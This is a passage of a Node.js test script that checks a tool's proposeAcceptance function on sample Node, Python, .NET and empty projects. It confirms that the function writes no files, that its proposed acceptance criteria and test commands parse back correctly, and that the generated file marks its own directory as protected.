    await fs.mkdir(root, { recursive: true });
    for (const [file, content] of Object.entries(files)) await fs.writeFile(path.join(root, file), content);
    return root;
  };
  const SAMPLES = [
    ['node', { 'package.json': JSON.stringify({ scripts: { test: 'node --test', lint: 'eslint .', build: 'vite build' } }) }, ['npm test', 'npm run lint', 'npm run build']],
    ['python', { 'pyproject.toml': '[tool.pytest.ini_options]\n' }, ['python -m pytest -q']],
    ['dotnet', { 'Sample.sln': '\n', 'Sample.csproj': '<Project Sdk="Microsoft.NET.Sdk" />\n' }, ['dotnet test']],
  ];
  for (const [name, files, commands] of SAMPLES) {
    const root = await project(name, files);
    const before = await listTree(root);
    const proposal = await proposeAcceptance(root);
    assert.deepEqual(await listTree(root), before, `${name}: proposeAcceptance writes nothing`);
    assert.equal(existsSync(path.join(root, '.chatmcp')), false);
    assert.equal(proposal.sha256, sha(Buffer.from(proposal.text, 'utf8')));
    assert.deepEqual(parseAcceptance(proposal.text), proposal.acceptance, `${name}: the proposed text reads back to the proposed object`);
    assert.deepEqual(proposal.acceptance.criteria.flatMap((c) => c.checks.map((check) => check.run)), commands, name);
    assert.equal(new Set(proposal.acceptance.criteria.map((c) => c.id)).size, proposal.acceptance.criteria.length);
    assert.match(proposal.text, /^# /, 'the proposal starts with a comment that says what it is');
    assert.ok(proposal.acceptance.protected.includes('.chatmcp/**'), 'the file protects itself');
  }
  // A project with nothing to discover gets one manual criterion to fill in, still a valid file.
  const empty = await project('empty', {});
  const blank = await proposeAcceptance(empty);
  assert.equal(blank.acceptance.criteria.length, 1);
  assert.ok(blank.acceptance.criteria[0].manual);
  assert.deepEqual(await listTree(empty), []);
  // A script name with YAML-significant characters is quoted, so the text still reads back to the same command.
  const odd = await project('odd', { 'package.json': JSON.stringify({ scripts: { test: 'x' } }), 'tsconfig.json': '{}' });
  const oddProposal = await proposeAcceptance(odd);
  assert.deepEqual(parseAcceptance(oddProposal.text), oddProposal.acceptance);
  assert.ok(oddProposal.acceptance.criteria.some((c) => c.checks?.[0].run === 'npx --no-install tsc --noEmit'));
  await assert.rejects(proposeAcceptance('relative'), TypeError);
  ok('proposeAcceptance on Node, Python, .NET and an empty project: writes nothing, the text reads back to the proposed object, ids unique, the file protects itself');

  console.log(`verify-proof-acceptance: ${passed} checks passed`);
} finally {
  await fs.rm(tmp, { recursive: true, force: true });
}
